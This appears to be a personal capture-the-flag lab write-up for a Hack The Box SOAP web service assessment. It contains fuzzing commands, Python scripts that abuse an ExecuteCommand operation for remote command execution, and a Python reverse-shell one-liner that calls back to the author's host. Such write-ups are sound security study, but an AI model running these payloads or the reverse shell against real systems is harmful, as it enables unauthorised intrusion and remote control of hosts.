@@ -1231,3 +1231,261 @@ What URI scheme should you specify inside an entity to retrieve the content of a
 file
 
 ## Skills Assessment
+
+Our client tasks us with assessing a SOAP web service whose WSDL file resides at http://<TARGET IP>:3002/wsdl?wsdl.
+
+Assess the target, identify an SQL Injection vulnerability through SOAP messages and answer the question below.
+
+
+----------------------
+Question in this section:
+Submit the password of the user that has a username of "admin". Answer format: FLAG{string}. Please note that the service will respond successfully only after submitting the proper SQLi payload, otherwise it will hang or throw an error. 
+
+
+So this automatically gives us the page to and the parameter so we can fuzz. But I have to wonder if it is worth fuzzing for other pages on this IP, so I will do that in the background.
+
+`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.129.202.133:3002/FUZZ -ic`
+
+Nothing else. So lets curl that url like before and see if we can identify the SOAP.
+
+`curl http://10.129.202.133:3002/wsdl?wsdl`
+
+returns:
+``` xml
+<?xml version="1.0" encoding="UTF-8"?>
+<wsdl:definitions targetNamespace="http://tempuri.org/" 
+  xmlns:s="http://www.w3.org/2001/XMLSchema" 
+  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" 
+  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" 
+  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" 
+  xmlns:tns="http://tempuri.org/" 
+  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
+  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" 
+  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
+  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
+  
+  <wsdl:types>
+    
+    
+    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
+      
+      
+      
+      <s:element name="LoginRequest">
+        
+        <s:complexType>
+          <s:sequence>
+            <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
+            <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
+          </s:sequence>
+        </s:complexType>
+        
+      </s:element>
+      
+      
+      <s:element name="LoginResponse">
+        
+        <s:complexType>
+          <s:sequence>
+            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
+          </s:sequence>
+        </s:complexType>
+      </s:element>
+      
+      
+      <s:element name="ExecuteCommandRequest">
+        
+        <s:complexType>
+          <s:sequence>
+            <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
+          </s:sequence>
+        </s:complexType>
+        
+      </s:element>
+      
+      <s:element name="ExecuteCommandResponse">
+        
+        <s:complexType>
+          <s:sequence>
+            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
+          </s:sequence>
+        </s:complexType>
+        
+      </s:element>
+      
+      
+      
+    </s:schema>
+    
+    
+  </wsdl:types>
+  
+  
+  
+  
+  <!-- Login Messages -->
+  <wsdl:message name="LoginSoapIn">
+    
+    <wsdl:part name="parameters" element="tns:LoginRequest"/>
+    
+  </wsdl:message>
+  
+  
+  <wsdl:message name="LoginSoapOut">
+    
+    <wsdl:part name="parameters" element="tns:LoginResponse"/>
+    
+  </wsdl:message>
+  
+  
+  <!-- ExecuteCommand Messages -->
+  <wsdl:message name="ExecuteCommandSoapIn">
+    
+    <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
+    
+  </wsdl:message>
+  
+  
+  <wsdl:message name="ExecuteCommandSoapOut">
+    
+    <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
+    
+  </wsdl:message>
+  
+  
+  
+  
+  
+  <wsdl:portType name="HacktheBoxSoapPort">
+    
+    
+    <!-- Login Operaion | PORT -->
+    <wsdl:operation name="Login">
+      
+      <wsdl:input message="tns:LoginSoapIn"/>
+      <wsdl:output message="tns:LoginSoapOut"/>
+      
+    </wsdl:operation>
+    
+    
+    <!-- ExecuteCommand Operation | PORT -->
+    <wsdl:operation name="ExecuteCommand">
+      
+      <wsdl:input message="tns:ExecuteCommandSoapIn"/>
+      <wsdl:output message="tns:ExecuteCommandSoapOut"/>
+      
+    </wsdl:operation>
+    
+  </wsdl:portType>
+  
+  
+  
+  
+  
+  <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
+    
+    
+    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
+    
+    <!-- SOAP Login Action -->
+    <wsdl:operation name="Login">
+      
+      <soap:operation soapAction="Login" style="document"/>
+      
+      <wsdl:input>
+        <soap:body use="literal"/>
+      </wsdl:input>
+      
+      <wsdl:output>
+        <soap:body use="literal"/>
+      </wsdl:output>
+      
+    </wsdl:operation>
+    
+    
+    <!-- SOAP ExecuteCommand Action -->
+    <wsdl:operation name="ExecuteCommand">
+      <soap:operation soapAction="ExecuteCommand" style="document"/>
+      
+      <wsdl:input>
+        <soap:body use="literal"/>
+      </wsdl:input>
+      
+      <wsdl:output>
+        <soap:body use="literal"/>
+      </wsdl:output>
+    </wsdl:operation>
+    
+    
+  </wsdl:binding>
+  
+  
+  
+  
+  
+  <wsdl:service name="HacktheboxService">
+    
+    
+    <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
+      <soap:address location="http://localhost:80/wsdl"/>
+    </wsdl:port>
+    
+    
+  </wsdl:service>
+  
+  
+  
+  
+  
+</wsdl:definitions>
+```
+
+Looks very similar to the ones we saw in the past.
+
+So lets try this python script again:
+``` python
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+And low and behold that worked.
+
+
+So lets try:
+``` python
+import requests
+
+while True:
+    cmd = input("$ ")
+    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
+    index = str(requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content).find("result")
+    print(requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content[index:])
+```
+
+This is a slightly modified script that trims some of the useless output.
+
+We know we are root so we should be able to do whatever we want.
+
+This is the output of ls
+```
+app.js\nclient.js\n_config.yml\nmy_app_err.log\nmy_app_log.log\nnode_modules\npackage.json\npackage-lock.json\nreadme.md\nservice.wsdl
+```
+
+Logs seem pretty useless. I'm gonna try and set up a reverse shell so I am not dealing with annoying output.
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.170",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+In another window:
+`nc -nvlp 1337`
+
+
+And that worked (thank god...)
+
+Lol... the answer is just in app.js. Was expecting that to be more difficult.
+
+It seems to indicate I was supposed to get a sql injection of some kind... but I did it without that so eff it as they say.
